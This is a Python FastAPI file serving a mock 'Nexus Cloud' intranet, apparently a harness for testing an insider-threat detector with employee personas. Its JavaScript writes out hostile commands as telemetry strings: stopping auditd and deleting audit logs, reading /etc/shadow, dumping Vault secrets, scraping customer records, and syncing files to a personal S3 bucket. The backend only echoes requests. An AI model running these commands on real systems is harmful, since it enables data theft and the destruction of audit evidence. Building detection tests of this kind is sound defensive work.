import os
import json
import uvicorn
from pathlib import Path
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
import logging

app = FastAPI(title="Nexus Cloud - Internal Enterprise Intranet Portal")
logging.basicConfig(level=logging.INFO)

# Load Company Profile
PROFILE_PATH = Path(__file__).resolve().parents[1] / "config" / "company_profile.json"
COMPANY_PROFILE = {}
if PROFILE_PATH.exists():
    try:
        with open(PROFILE_PATH, "r", encoding="utf-8") as f:
            COMPANY_PROFILE = json.load(f)
    except Exception as e:
        logging.error(f"Failed to load company profile from {PROFILE_PATH}: {e}")

HTML_INT_HEAD = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nexus Cloud - Corporate Intranet & Developer Workspace</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-body: #f8fafc;
            --bg-card: #ffffff;
            --text-main: #0f172a;
            --text-muted: #64748b;
            --border-color: #e2e8f0;
            --primary: #2563eb;
            --primary-hover: #1d4ed8;
            --indigo: #4f46e5;
            --purple: #7c3aed;
            --danger: #dc2626;
            --warning: #d97706;
            --success: #16a34a;
        }
        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
        code, pre { font-family: 'JetBrains Mono', monospace; }
        body { margin: 0; background-color: var(--bg-body); color: var(--text-main); display: flex; flex-direction: column; min-height: 100vh; }
        
        /* Top Navigation */
        nav { background: var(--bg-card); border-bottom: 1px solid var(--border-color); padding: 0.9rem 2.5rem; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; box-shadow: 0 1px 3px rgba(0,0,0,0.03); }
        .logo-container { display: flex; align-items: center; gap: 12px; text-decoration: none; color: var(--text-main); font-weight: 800; font-size: 1.25rem; }
        .logo-box { background: var(--indigo); color: white; width: 34px; height: 34px; display: flex; align-items: center; justify-content: center; border-radius: 8px; font-weight: 800; }
        .badge-intranet { background: #fee2e2; color: #991b1b; padding: 0.25rem 0.6rem; border-radius: 6px; font-size: 0.7rem; font-weight: 800; letter-spacing: 0.05em; border: 1px solid #fecaca; }
        .network-pill { background: #ecfdf5; color: #065f46; border: 1px solid #a7f3d0; padding: 0.3rem 0.75rem; border-radius: 999px; font-size: 0.75rem; font-weight: 600; display: flex; align-items: center; gap: 6px; }
        .dot { width: 8px; height: 8px; border-radius: 50%; background: #10b981; }

        main { flex-grow: 1; padding: 2rem 2.5rem; width: 100%; max-width: 1400px; margin: 0 auto; }
        footer { background: var(--bg-card); border-top: 1px solid var(--border-color); padding: 1.5rem; text-align: center; color: var(--text-muted); font-size: 0.85rem; margin-top: auto; }

        /* Persona Bar */
        .persona-bar { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 14px; padding: 1.25rem 1.5rem; margin-bottom: 2rem; box-shadow: 0 1px 4px rgba(0,0,0,0.04); }
        .persona-quick-pills { display: flex; gap: 0.6rem; flex-wrap: wrap; margin-top: 0.75rem; }
        .btn-persona { background: #f1f5f9; border: 1px solid #cbd5e1; padding: 0.5rem 0.85rem; border-radius: 8px; font-size: 0.8rem; font-weight: 600; color: #334155; cursor: pointer; transition: all 0.15s; display: flex; align-items: center; gap: 6px; }
        .btn-persona:hover { background: #e2e8f0; }
        .btn-persona.active { background: var(--indigo); border-color: var(--indigo); color: white; box-shadow: 0 2px 6px rgba(79, 70, 229, 0.35); }
        
        .active-user-strip { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem; border-top: 1px dashed var(--border-color); padding-top: 1rem; margin-top: 1rem; font-size: 0.85rem; }
        .user-tag { background: #f8fafc; border: 1px solid #e2e8f0; padding: 0.35rem 0.75rem; border-radius: 6px; }

        /* Grid Layout */
        .workspace-grid { display: grid; grid-template-columns: 320px 1fr; gap: 1.75rem; }
        @media (max-width: 1024px) { .workspace-grid { grid-template-columns: 1fr; } }

        .card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 14px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
        .card-header { padding: 1rem 1.25rem; border-bottom: 1px solid var(--border-color); font-weight: 700; font-size: 0.95rem; display: flex; justify-content: space-between; align-items: center; }
        .card-body { padding: 1.25rem; }

        /* File Explorer */
        .file-list { display: flex; flex-direction: column; gap: 0.35rem; }
        .file-item { padding: 0.65rem 0.85rem; border: 1px solid transparent; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: space-between; font-size: 0.825rem; transition: all 0.15s; }
        .file-item:hover { background: #f8fafc; border-color: var(--border-color); }
        .file-item.danger-file { color: #b91c1c; }
        .file-item.danger-file:hover { background: #fef2f2; border-color: #fecaca; }
        .tag-scope { font-size: 0.7rem; font-weight: 700; padding: 0.15rem 0.4rem; border-radius: 4px; }

        /* Tools */
        .tool-panel { display: flex; flex-direction: column; gap: 1.5rem; }
        .tool-card { border: 1px solid var(--border-color); border-radius: 12px; background: white; padding: 1.25rem; }
        .tool-card h4 { margin: 0 0 0.5rem 0; font-size: 1rem; color: #1e293b; display: flex; align-items: center; justify-content: space-between; }
        .tool-card p { margin: 0 0 1rem 0; font-size: 0.825rem; color: var(--text-muted); }
        
        .form-row { display: flex; gap: 0.6rem; }
        input[type="text"], select { width: 100%; padding: 0.65rem 0.85rem; border: 1px solid #cbd5e1; border-radius: 8px; outline: none; font-size: 0.85rem; }
        input:focus, select:focus { border-color: var(--primary); }
        .btn-action { background: var(--primary); color: white; border: none; padding: 0.65rem 1.25rem; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 0.825rem; white-space: nowrap; transition: 0.2s; }
        .btn-action:hover { background: var(--primary-hover); }
        .btn-action.btn-danger { background: var(--danger); }
        .btn-action.btn-danger:hover { background: #b91c1c; }
        .btn-action.btn-dark { background: #0f172a; }

        /* Result Console */
        .result-box { margin-top: 1.5rem; padding: 1.25rem; border-radius: 12px; font-size: 0.85rem; border: 1px solid var(--border-color); background: #0f172a; color: #e2e8f0; display: none; line-height: 1.55; }
        .result-box.error { background: #450a0a; border-color: #7f1d1d; color: #fecaca; }
        .result-box.success { background: #064e3b; border-color: #065f46; color: #a7f3d0; }
        .result-header { font-weight: 700; margin-bottom: 0.5rem; display: flex; align-items: center; justify-content: space-between; }
    </style>
</head>
<body>
    <nav>
        <div style="display: flex; align-items: center; gap: 1rem;">
            <a href="/workspace" class="logo-container">
                <div class="logo-box">N</div>
                Nexus Cloud Intranet
            </a>
            <span class="badge-intranet">INTERNAL RESTRICTED</span>
        </div>
        <div class="network-pill">
            <span class="dot"></span>
            Internal Corporate Gateway (:8090)
        </div>
    </nav>
    <main>
        <!-- Identity & Scenario Controller -->
        <div class="persona-bar">
            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 0.5rem;">
                <div>
                    <h3 style="margin: 0; font-size: 1.05rem; font-weight: 800;">Authenticated Employee Session (Ground-Truth Company Directory)</h3>
                    <p style="margin: 0.25rem 0 0 0; font-size: 0.8rem; color: var(--text-muted);">
                        Select an employee persona to test normal departmental tasks vs. modern 2026 malicious insider scenarios.
                    </p>
                </div>
                <div style="display: flex; align-items: center; gap: 0.5rem;">
                    <label style="font-size: 0.8rem; font-weight: 600;">Directory Search:</label>
                    <select id="employee-dropdown" onchange="onDropdownSelect(this.value)" style="width: 250px;">
                        <!-- Injected via Python / JS -->
                    </select>
                </div>
            </div>

            <!-- Quick Scenario Switcher -->
            <div class="persona-quick-pills">
                <button class="btn-persona active" id="pill-usr_dev_01" onclick="switchPersona('usr_dev_01')">
                    🔬 Dr. Sarah Chen (ML Engineer)
                </button>
                <button class="btn-persona" id="pill-usr_sre_02" onclick="switchPersona('usr_sre_02')">
                    🛡️ Marcus Vance (Cloud SRE / Admin)
                </button>
                <button class="btn-persona" id="pill-usr_sup_03" onclick="switchPersona('usr_sup_03')">
                    🎧 Carol Rodriguez (Customer Support)
                </button>
                <button class="btn-persona" id="pill-usr_hr_04" onclick="switchPersona('usr_hr_04')">
                    👥 Bob Jones (People Operations / HR)
                </button>
                <button class="btn-persona" id="pill-usr_fin_05" onclick="switchPersona('usr_fin_05')">
                    📊 David Sterling (Financial Controller)
                </button>
            </div>

            <!-- Active User Metadata Strip -->
            <div class="active-user-strip">
                <div><strong>User ID:</strong> <span class="user-tag" id="disp-uid">usr_dev_01</span></div>
                <div><strong>Role:</strong> <span class="user-tag" id="disp-role">Lead ML Research Engineer</span></div>
                <div><strong>Department:</strong> <span class="user-tag" id="disp-dept">AI_Platform</span></div>
                <div><strong>Assigned Device:</strong> <span class="user-tag" id="disp-device">MAC-ENG-9102</span></div>
                <div><strong>SSH Access:</strong> <span class="user-tag" id="disp-ssh" style="color: #16a34a; font-weight: 700;">AUTHORIZED</span></div>
            </div>
        </div>

        <!-- Main Workspace -->
        <div class="workspace-grid">
            <!-- Left: Corporate File Share -->
            <div class="card" style="height: fit-content;">
                <div class="card-header">
                    <span>Corporate File Share</span>
                    <span style="font-size: 0.75rem; color: var(--text-muted);">S3 / NFS Root</span>
                </div>
                <div class="card-body" style="padding: 0.75rem;">
                    <p style="font-size: 0.75rem; color: var(--text-muted); margin: 0 0 0.75rem 0.25rem;">
                        Clicking files triggers read operations. Accessing files outside the active department's authorized scope flags a <code>scope_violation</code>.
                    </p>
                    <div class="file-list">
                        <!-- AI Platform Files -->
                        <div class="file-item" onclick="triggerAction('read_file', '/models/nexus-foundation-70b/weights.safetensors')">
                            <span>🤖 <code>weights.safetensors</code></span>
                            <span class="tag-scope" style="background: #ede9fe; color: #6d28d9;">AI_Platform</span>
                        </div>
                        <div class="file-item" onclick="triggerAction('read_file', '/training_data/proprietary_embeddings.parquet')">
                            <span>📄 <code>embeddings.parquet</code></span>
                            <span class="tag-scope" style="background: #ede9fe; color: #6d28d9;">AI_Platform</span>
                        </div>

                        <!-- DevOps / Infrastructure Files -->
                        <div class="file-item" onclick="triggerAction('read_file', '/vault/prod/db_credentials.enc')">
                            <span>🔐 <code>vault/db_credentials</code></span>
                            <span class="tag-scope" style="background: #e0f2fe; color: #0369a1;">Cloud_DevOps</span>
                        </div>
                        <div class="file-item" onclick="triggerAction('read_file', '/infrastructure/terraform.tfstate')">
                            <span>☁️ <code>terraform.tfstate</code></span>
                            <span class="tag-scope" style="background: #e0f2fe; color: #0369a1;">Cloud_DevOps</span>
                        </div>

                        <!-- Customer Success Files -->
                        <div class="file-item" onclick="triggerAction('read_file', '/support/tickets/enterprise_tickets_q3.json')">
                            <span>🎫 <code>support_tickets.json</code></span>
                            <span class="tag-scope" style="background: #fef3c7; color: #b45309;">Customer_Success</span>
                        </div>

                        <!-- HR & Finance Files -->
                        <div class="file-item danger-file" onclick="triggerAction('read_file', '/hr/payroll_executive_2026.csv')">
                            <span>💰 <code>payroll_2026.csv</code></span>
                            <span class="tag-scope" style="background: #fee2e2; color: #b91c1c;">Finance_HR</span>
                        </div>
                        <div class="file-item danger-file" onclick="triggerAction('read_file', '/finance/ledger/q3_earnings_forecast.xlsx')">
                            <span>📈 <code>q3_forecast.xlsx</code></span>
                            <span class="tag-scope" style="background: #fee2e2; color: #b91c1c;">Finance_HR</span>
                        </div>
                        <div class="file-item danger-file" onclick="triggerAction('read_file', '/etc/shadow')">
                            <span>🔒 <code>/etc/shadow</code></span>
                            <span class="tag-scope" style="background: #f1f5f9; color: #334155;">System Root</span>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Right: Department Specific Tooling Panels -->
            <div class="tool-panel">
                
                <!-- Dynamic Department Container -->
                <div class="card">
                    <div class="card-header" id="dept-tool-header">
                        Department Operational Tools
                    </div>
                    <div class="card-body" id="dept-tool-content">
                        <!-- Injected via JavaScript based on active department -->
                    </div>
                </div>

                <!-- Universal Enterprise Tool: External Cloud Sync Simulator -->
                <div class="card">
                    <div class="card-header">
                        <span>External Cloud Sync (Personal S3 / HuggingFace / Dropbox)</span>
                        <span style="font-size: 0.75rem; color: var(--text-muted);">Exfiltration Vector</span>
                    </div>
                    <div class="card-body">
                        <p style="font-size: 0.825rem; color: var(--text-muted); margin-top: 0;">
                            Simulates transferring corporate data to an external personal cloud endpoint (e.g. <code>huggingface.co/sarah_personal/repo</code> or <code>s3://personal-drop-bucket</code>).
                        </p>
                        <div class="form-row">
                            <input type="text" id="sync-source" placeholder="Source Path (e.g. /models/nexus-foundation-70b/weights.safetensors)">
                            <button class="btn-action btn-danger" onclick="triggerAction('cloud_sync', document.getElementById('sync-source').value)">
                                Exfiltrate to External Cloud
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Result Console -->
                <div id="action-result" class="result-box">
                    <div class="result-header">
                        <span id="result-title">Security Inspection Output</span>
                        <span id="result-status-tag" style="font-size: 0.75rem;">COMPLETED</span>
                    </div>
                    <div id="result-body" style="white-space: pre-wrap; font-family: 'JetBrains Mono', monospace;"></div>
                </div>

            </div>
        </div>

    </main>
    <footer>
        &copy; 2026 Nexus Cloud Technologies Inc. | Corporate Intranet & Development Portal (:8090)
    </footer>

    <script>
        // Company Profile injected from backend
        const COMPANY_PROFILE = """ + json.dumps(COMPANY_PROFILE) + """;

        let currentPersona = "usr_dev_01";

        function initDropdown() {
            const select = document.getElementById("employee-dropdown");
            select.innerHTML = "";
            (COMPANY_PROFILE.employees || []).forEach(emp => {
                const opt = document.createElement("option");
                opt.value = emp.user_id;
                opt.innerText = `${emp.name} (${emp.role})`;
                select.appendChild(opt);
            });
            select.value = currentPersona;
        }

        function onDropdownSelect(uid) {
            switchPersona(uid);
        }

        function switchPersona(uid) {
            currentPersona = uid;
            const emp = (COMPANY_PROFILE.employees || []).find(e => e.user_id === uid);
            if (!emp) return;

            document.getElementById("employee-dropdown").value = uid;

            // Highlight Pill if exists
            document.querySelectorAll(".btn-persona").forEach(p => p.classList.remove("active"));
            const pill = document.getElementById(`pill-${uid}`);
            if (pill) pill.classList.add("active");

            // Update Metadata Strip
            document.getElementById("disp-uid").innerText = emp.user_id;
            document.getElementById("disp-role").innerText = emp.role;
            document.getElementById("disp-dept").innerText = emp.department;
            document.getElementById("disp-device").innerText = emp.assigned_device;

            // Check SSH policy
            const allowedSSH = (COMPANY_PROFILE.ssh_policy?.allowed_roles || []).includes(emp.department);
            const sshElem = document.getElementById("disp-ssh");
            if (allowedSSH) {
                sshElem.innerText = "AUTHORIZED";
                sshElem.style.color = "#16a34a";
            } else {
                sshElem.innerText = "BLOCKED / HONEYPOT";
                sshElem.style.color = "#dc2626";
            }

            renderDepartmentTools(emp.department);
        }

        function renderDepartmentTools(dept) {
            const header = document.getElementById("dept-tool-header");
            const container = document.getElementById("dept-tool-content");

            if (dept === "AI_Platform") {
                header.innerText = "AI & Foundation Model Tools (Dr. Sarah Chen's Workspace)";
                container.innerHTML = `
                    <div class="tool-card">
                        <h4>
                            <span>Export Model Checkpoint & Embeddings</span>
                            <span class="tag-scope" style="background: #ede9fe; color: #6d28d9;">Standard AI Task</span>
                        </h4>
                        <p>Compress and stage latest foundation model checkpoint for internal evaluation.</p>
                        <div class="form-row">
                            <input type="text" id="ai-model-target" value="/models/nexus-foundation-70b/weights.safetensors">
                            <button class="btn-action" onclick="triggerAction('model_export', document.getElementById('ai-model-target').value)">
                                Export Weights
                            </button>
                        </div>
                    </div>
                `;
            } else if (dept === "Cloud_DevOps") {
                header.innerText = "Cloud Infrastructure & SRE Tools (Marcus Vance's Workspace)";
                container.innerHTML = `
                    <div class="tool-card">
                        <h4>
                            <span>HashiCorp Vault Secret Dump (Privileged Harvest)</span>
                            <span class="tag-scope" style="background: #fee2e2; color: #b91c1c;">High-Risk Admin Probe</span>
                        </h4>
                        <p>Query raw production database keys and master service tokens from Vault.</p>
                        <div class="form-row">
                            <input type="text" id="vault-key" value="/vault/prod/db_credentials.enc">
                            <button class="btn-action btn-danger" onclick="triggerAction('vault_dump', document.getElementById('vault-key').value)">
                                Dump Production Vault Secrets
                            </button>
                        </div>
                    </div>
                    <div class="tool-card" style="margin-top: 1rem;">
                        <h4>
                            <span>Anti-Forensics: Audit Logging Daemon Toggle</span>
                            <span class="tag-scope" style="background: #fee2e2; color: #b91c1c;">Cover-Up Indicator</span>
                        </h4>
                        <p>Disable Datadog agent and terminate auditd daemon to blind security sensors.</p>
                        <div class="form-row">
                            <button class="btn-action btn-danger" onclick="triggerAction('disable_auditd', 'systemctl stop auditd && rm -rf /var/log/audit.log')">
                                Terminate Audit Logging & Purge Logs
                            </button>
                        </div>
                    </div>
                `;
            } else if (dept === "Customer_Success") {
                header.innerText = "Customer Support & Tenant Management (Carol Rodriguez's Workspace)";
                container.innerHTML = `
                    <div class="tool-card">
                        <h4>
                            <span>Cross-Tenant Customer PII Database Dump</span>
                            <span class="tag-scope" style="background: #fee2e2; color: #b91c1c;">Data Trafficking Violation</span>
                        </h4>
                        <p>Scrape customer billing details, phone numbers, and payment tokens across all customer tenants.</p>
                        <div class="form-row">
                            <button class="btn-action btn-danger" onclick="triggerAction('tenant_scrape', '/admin/tenants/export_all_customers.json')">
                                Scrape All Customer Records
                            </button>
                        </div>
                    </div>
                `;
            } else if (dept === "Finance_HR") {
                header.innerText = "Finance & People Operations Tools (Bob Jones / David Sterling's Workspace)";
                container.innerHTML = `
                    <div class="tool-card">
                        <h4>
                            <span>Payroll & Executive Equity Ledger Export</span>
                            <span class="tag-scope" style="background: #fee2e2; color: #b91c1c;">Pre-Resignation Theft</span>
                        </h4>
                        <p>Download unredacted employee compensation, social security numbers, and bank routing details.</p>
                        <div class="form-row">
                            <button class="btn-action btn-danger" onclick="triggerAction('export_payroll', '/hr/payroll_executive_2026.csv')">
                                Download Executive Payroll
                            </button>
                        </div>
                    </div>
                `;
            } else {
                header.innerText = "General Corporate Employee Workspace";
                container.innerHTML = `
                    <p style="color: var(--text-muted); font-size: 0.85rem;">Standard office tools and documentation view.</p>
                `;
            }
        }

        async function triggerAction(actionType, targetValue) {
            const emp = (COMPANY_PROFILE.employees || []).find(e => e.user_id === currentPersona);
            const resDiv = document.getElementById("action-result");
            const resBody = document.getElementById("result-body");
            const resTitle = document.getElementById("result-title");
            const resTag = document.getElementById("result-status-tag");

            resDiv.style.display = "block";
            resDiv.className = "result-box";
            resTitle.innerText = "Evaluating Telemetry against AdaptiveShield Gateway...";
            resTag.innerText = "INSPECTING";
            resBody.innerText = `[CLIENT TELEMETRY SIGNAL SENT]
User: ${emp.name} (${emp.user_id})
Department: ${emp.department} | Assigned IP: ${emp.assigned_ip}
Action: ${actionType}
Target: ${targetValue}
Timestamp: ${new Date().toISOString()}`;

            let command = "";
            let filePath = "";
            let isCloudUpload = false;

            if (actionType === 'read_file') {
                command = `cat ${targetValue}`;
                filePath = targetValue;
            } else if (actionType === 'cloud_sync') {
                command = `aws s3 sync ${targetValue} s3://personal-drop-bucket/ --region us-east-1`;
                filePath = targetValue;
                isCloudUpload = true;
            } else if (actionType === 'model_export') {
                command = `tar -czf /tmp/model_checkpoint.tar.gz ${targetValue}`;
                filePath = targetValue;
            } else if (actionType === 'vault_dump') {
                command = `vault kv get -format=json secret/production/database > ${targetValue}`;
                filePath = targetValue;
            } else if (actionType === 'disable_auditd') {
                command = targetValue;
            } else if (actionType === 'tenant_scrape') {
                command = `curl -H "Auth: Bearer token" https://api.nexuscloud.internal/v1/customers/export_all > ${targetValue}`;
                filePath = targetValue;
            } else if (actionType === 'export_payroll') {
                command = `pg_dump -t payroll_ledger nexus_corp_db > ${targetValue}`;
                filePath = targetValue;
            }

            try {
                const response = await fetch('/workspace/api/action', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'x-user-id': emp.user_id,
                        'x-user-role': emp.department
                    },
                    body: JSON.stringify({
                        action: actionType,
                        command: command,
                        file_path: filePath,
                        cloud_upload: isCloudUpload,
                        source_ip: emp.assigned_ip,
                        timestamp: new Date().toISOString()
                    })
                });

                if (response.status === 403) {
                    resDiv.className = "result-box error";
                    resTitle.innerText = "🚨 ADAPTIVESHIELD GUARD: Insider Threat Anomaly Detected!";
                    resTag.innerText = "ACTION BLOCKED";
                    resBody.innerText += `\n\n[GUARD VERDICT: 403 FORBIDDEN - POLICY VIOLATION]
Reason: Anomaly score exceeded threshold. Scope violation or exfiltration attempt detected.
Session marked for security analyst review.`;
                    return;
                }

                const data = await response.json();
                resDiv.className = "result-box success";
                resTitle.innerText = "✅ ADAPTIVESHIELD GUARD: Activity Approved";
                resTag.innerText = "AUTHORIZED";
                resBody.innerText += `\n\n[GUARD VERDICT: 200 OK - BEHAVIOR NORMAL]
Backend Response: ${data.message || 'Operation executed within allowed scope.'}`;
            } catch(e) {
                resDiv.className = "result-box error";
                resTitle.innerText = "Network Gateway Interruption";
                resBody.innerText += `\n\nConnection dropped by security interceptor proxy.`;
            }
        }

        // Initialize on load
        window.addEventListener("DOMContentLoaded", () => {
            initDropdown();
            switchPersona("usr_dev_01");
        });
    </script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse)
@app.get("/workspace", response_class=HTMLResponse)
async def internal_workspace():
    return HTML_INT_HEAD

@app.post("/workspace/api/action")
@app.post("/{path:path}")
async def internal_action_handler(path: str, request: Request):
    try:
        body = await request.json()
    except Exception:
        body = {}
    return JSONResponse(content={
        "status": "success",
        "message": f"Action on /{path} processed normally by internal service.",
        "payload": body
    })

if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8090)
